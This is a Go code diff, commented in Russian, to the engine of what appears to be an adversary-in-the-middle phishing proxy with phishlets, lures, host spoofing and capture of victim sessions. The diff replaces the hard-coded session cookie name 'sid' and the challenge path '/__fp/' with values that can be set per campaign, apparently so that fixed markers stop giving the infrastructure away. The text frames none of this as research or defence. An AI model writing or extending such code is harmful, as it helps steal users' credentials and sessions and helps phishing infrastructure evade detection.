@@ -31,6 +31,8 @@ type Engine struct {
 	lures    core.LureStore
 	spoof    func(host string) string
 	challenge func() string
+	sidName   string
+	chPrefix  string
 	js       func(src string, seed int64) string
 	limit    Limiter
 	capMu    sync.Mutex
@@ -45,7 +47,29 @@ type Engine struct {
 type Limiter interface{ Allow(ip string) bool }
 
 func New(store core.PhishletStore, sessions core.SessionStore, bus core.EventBus) *Engine {
-	return &Engine{store: store, sessions: sessions, bus: bus, capped: map[string]bool{}}
+	return &Engine{store: store, sessions: sessions, bus: bus, capped: map[string]bool{},
+		sidName: "sid", chPrefix: "/__fp/"}
+}
+
+// SetSidName меняет имя session-cookie (дефолт sid). Свой ID на кампанию.
+func (e *Engine) SetSidName(name string) {
+	if name != "" {
+		e.sidName = name
+	}
+}
+
+// SetChallengePrefix меняет префикс challenge-путей (дефолт /__fp/).
+func (e *Engine) SetChallengePrefix(prefix string) {
+	if prefix == "" {
+		return
+	}
+	if !strings.HasPrefix(prefix, "/") {
+		prefix = "/" + prefix
+	}
+	if !strings.HasSuffix(prefix, "/") {
+		prefix += "/"
+	}
+	e.chPrefix = prefix
 }
 
 func (e *Engine) markCaptured(sid string) {
@@ -96,7 +120,7 @@ func (e *Engine) SetChallenge(h http.Handler) { e.fp = h }
 func (e *Engine) SetTracker(h http.Handler) { e.track = h }
 
 func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
-	if e.fp != nil && strings.HasPrefix(r.URL.Path, "/__fp/") {
+	if e.fp != nil && strings.HasPrefix(r.URL.Path, e.chPrefix) {
 		e.fp.ServeHTTP(w, r)
 		return
 	}
@@ -155,8 +179,8 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	}
 
 
-	// Сессия через cookie sid + валидация (anti-fixation) + привязка IP/JA4.
-	sid := cookie(r, "sid")
+	// Сессия через cookie + валидация (anti-fixation) + привязка IP/JA4.
+	sid := cookie(r, e.sidName)
 	if sid != "" {
 		if sess, err := e.sessions.Get(r.Context(), sid); err != nil {
 			sid = ""
@@ -168,7 +192,7 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		if sess, err := e.sessions.Create(r.Context(), ph.ID, remoteIP(r)); err == nil {
 			sid = sess.ID
 			sess.JA4 = fp // best-effort привязка (memory персистит, redis — через следующую итерацию)
-			setSid(w, r, sid)
+			setSid(w, r, e.sidName, sid)
 		}
 	}
 
@@ -493,9 +517,9 @@ func bound(sess *core.Session, phishlet, ip, fp string) bool {
 	return true
 }
 
-func setSid(w http.ResponseWriter, r *http.Request, sid string) {
+func setSid(w http.ResponseWriter, r *http.Request, name, sid string) {
 	http.SetCookie(w, &http.Cookie{
-		Name: "sid", Value: sid, Path: "/",
+		Name: name, Value: sid, Path: "/",
 		HttpOnly: true, Secure: r.TLS != nil, SameSite: http.SameSiteLaxMode,
 	})
 }
